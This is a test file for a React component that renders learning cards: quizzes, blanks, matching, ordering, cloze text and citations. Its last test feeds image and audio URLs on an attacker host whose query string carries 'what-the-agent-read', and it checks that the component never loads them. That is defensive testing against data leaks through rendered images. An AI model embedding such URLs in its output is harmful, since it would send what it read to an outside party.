import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Blocks } from "./Blocks";
import { CardSideContext } from "./cardSide";
import { mixedOrder, placedMarks, type Block, type Cited } from "./blockData";

const draw = (block: Record<string, unknown>) => render(<Blocks blocks={[block as Block]} />);

test("a check on a card waits for the answer, then says one verdict and why", async () => {
  draw({ type: "quiz", question: "Which?", options: ["a", "b"], correctIndex: 1, explanation: "Correct: b is it." });
  expect(screen.queryByRole("status")).toBeNull();
  await userEvent.click(screen.getByRole("button", { name: "a" }));
  expect(screen.getByRole("status").textContent).toBe("Not quite. B is it.");
});

test("fill in the blank is typed and checked before the answer shows", async () => {
  draw({ type: "fillInBlank", prompt: "Half of 105 is ___", answer: "52.5", explanation: "Divide by two." });
  expect(screen.queryByText(/52\.5/)).toBeNull();
  await userEvent.type(screen.getByLabelText("Your answer"), "52,50");
  await userEvent.click(screen.getByRole("button", { name: "Check" }));
  expect(screen.getByRole("status").textContent).toBe("Right. Divide by two.");
});

test("fill in the blank with options is picked, not shown", async () => {
  draw({ type: "fillInBlank", prompt: "The ___ wins", answer: "first", options: ["first", "last"] });
  await userEvent.click(screen.getByRole("button", { name: "last" }));
  expect(screen.getByRole("status").textContent).toBe("Not quite. The answer: first.");
});

test("matching hides the pairs until the person matches and checks", async () => {
  draw({ type: "matching", pairs: [{ left: "one", right: "uno" }, { left: "two", right: "dos" }] });
  expect(screen.queryByRole("table")).toBeNull();
  const check = screen.getByRole("button", { name: "Check" });
  expect(check).toBeDisabled();
  const [first, second] = screen.getAllByRole("combobox");
  await userEvent.selectOptions(first!, "dos");
  await userEvent.selectOptions(second!, "uno");
  await userEvent.click(check);
  expect(screen.getByRole("status").textContent).toBe("0 of 2 matched.");
});

test("an ordering starts mixed, never in its answer's order, and is checked when asked", async () => {
  draw({ type: "orderExercise", prompt: "Put in order", items: ["first", "second", "third"], correctOrder: [0, 1, 2] });
  const list = screen.getAllByRole("list")[0]!;
  const shown = within(list).getAllByRole("listitem").map((li) => li.textContent?.replace(/[↑↓]/g, ""));
  expect(shown).not.toEqual(["first", "second", "third"]);
  await userEvent.click(screen.getByRole("button", { name: "Check the order" }));
  expect(screen.getByRole("status").textContent).toMatch(/^Not quite\. The right order:/);
});

test("a mixed order is fixed for the same things and never the written one", () => {
  expect(mixedOrder(4, "x")).toEqual(mixedOrder(4, "x"));
  for (const seed of ["a", "b", "c", "d", "e"]) expect(mixedOrder(2, seed)).toEqual([1, 0]);
});

test("cites sit at the block they support, numbered; a cite of the whole card or an older output's sits at its last words", () => {
  const bit: Cited = {
    blocks: [{ type: "heading", text: "H" }, { type: "text", text: "One." }, { type: "text", text: "Two." }, { type: "quiz", question: "?", options: [], correctIndex: 0 }] as Block[],
    cites: [
      { sourceId: "s1", quote: "one", block: 1, locator: { charStart: 0, charEnd: 10 } },
      { sourceId: "s1", quote: "whole" },
      { sourceId: "s1", quote: "one", block: 1, locator: { charStart: 0, charEnd: 10 } },
    ],
  };
  const marks = placedMarks(bit);
  expect(marks.get(1)?.map((m) => m.n)).toEqual([1]);
  expect(marks.get(2)?.map((m) => m.n)).toEqual([2]);
  expect(marks.has(3)).toBe(false);
});

test("a cite placed on a heading marks the words under it", () => {
  const bit: Cited = { blocks: [{ type: "heading", text: "H" }, { type: "text", text: "One." }] as Block[], cites: [{ sourceId: "s1", quote: "one", block: 0 }] };
  expect([...placedMarks(bit).keys()]).toEqual([1]);
});

test("a check's cite comes with its explanation, once answered, so the quoted words never give the answer away", async () => {
  render(<Blocks blocks={[{ type: "quiz", question: "Which?", options: ["a", "b"], correctIndex: 1, explanation: "B is it." } as Block]} marks={() => <span>cite-mark</span>} />);
  expect(screen.queryByText("cite-mark")).toBeNull();
  await userEvent.click(screen.getByRole("button", { name: "b" }));
  expect(screen.getByRole("status")).toHaveTextContent("Right. B is it.cite-mark");
});

test("background, what the maker added, is set apart and says it is not from the source", () => {
  draw({ type: "background", title: "Reading a p-value", text: "A p-value is usually read as ..." });
  const note = screen.getByRole("complementary", { name: "Background, not from your source" });
  expect(note).toHaveTextContent("Background · not from your source");
  expect(note).toHaveTextContent("Reading a p-value");
});

test("a cloze hides its key part until the card turns over, keeping its inline marks", () => {
  const block = { type: "cloze", text: "Heat flows from **warm** to [[cool]] until they [[match]]." } as Block;
  const { container, rerender } = render(
    <CardSideContext.Provider value={{ revealed: false }}>
      <Blocks blocks={[block]} />
    </CardSideContext.Provider>,
  );
  expect(container.textContent).not.toMatch(/cool|match/);
  expect(container.querySelectorAll(".gap:not(.shown)")).toHaveLength(2);
  expect(container.querySelector("strong, b")?.textContent).toBe("warm");
  rerender(
    <CardSideContext.Provider value={{ revealed: true }}>
      <Blocks blocks={[block]} />
    </CardSideContext.Provider>,
  );
  expect([...container.querySelectorAll(".gap.shown")].map((g) => g.textContent)).toEqual(["cool", "match"]);
});

test("a question on a card tells the card whether it was answered right, once", async () => {
  const answers: boolean[] = [];
  const answered = (right: boolean) => void answers.push(right);
  const { unmount } = render(
    <CardSideContext.Provider value={{ revealed: true, answered }}>
      <Blocks blocks={[{ type: "quiz", question: "Which?", options: ["a", "b"], correctIndex: 1 } as Block]} />
    </CardSideContext.Provider>,
  );
  await userEvent.click(screen.getByRole("button", { name: "a" }));
  expect(answers).toEqual([false]);
  unmount();
  render(
    <CardSideContext.Provider value={{ revealed: true, answered }}>
      <Blocks blocks={[{ type: "fillInBlank", prompt: "Heat goes to the ___ body.", answer: "cooler" } as Block]} />
    </CardSideContext.Provider>,
  );
  await userEvent.type(screen.getByLabelText("Your answer"), "Cooler");
  await userEvent.click(screen.getByRole("button", { name: "Check" }));
  expect(answers).toEqual([false, true]);
});

test("a picture or sound from a web address is never drawn; one Open Sourcebook keeps is, through the proxy; a link stays a link", () => {
  const remote = "https://attacker.example/p.png?d=what-the-agent-read";
  const { container } = render(
    <Blocks
      blocks={[
        { type: "figure", url: remote, caption: "A cup" },
        { type: "image", url: remote, systemIcon: "photo" },
        { type: "hero", url: remote, title: "Big" },
        { type: "gallery", images: [{ url: remote }, { url: "/v1/assets/kept1", caption: "Kept" }] },
        { type: "carousel", items: [{ url: "//attacker.example/q.png" }, { url: "data:image/svg+xml;base64,PHN2Zz4=" }] },
        { type: "audio", url: "https://attacker.example/a.mp3", title: "Sound" },
        { type: "figure", url: "data:image/png;base64,iVBORw0KGgo=", caption: "Embedded" },
        { type: "linkPreview", url: "https://example.com/story", title: "Story", domain: "example.com", imageURL: remote },
      ] as Block[]}
    />,
  );
  const sources = [...container.querySelectorAll("img, audio, video, source, iframe")].map((el) => el.getAttribute("src"));
  expect(sources).toEqual(["/api/v1/assets/kept1", "data:image/png;base64,iVBORw0KGgo="]);
  expect(container.innerHTML).not.toContain("attacker.example");
  // The figure without its picture still says what it showed; the link preview opens its page on a click.
  expect(screen.getByText("A cup")).toBeInTheDocument();
  expect(screen.getByRole("link", { name: "Story" })).toHaveAttribute("href", "https://example.com/story");
});
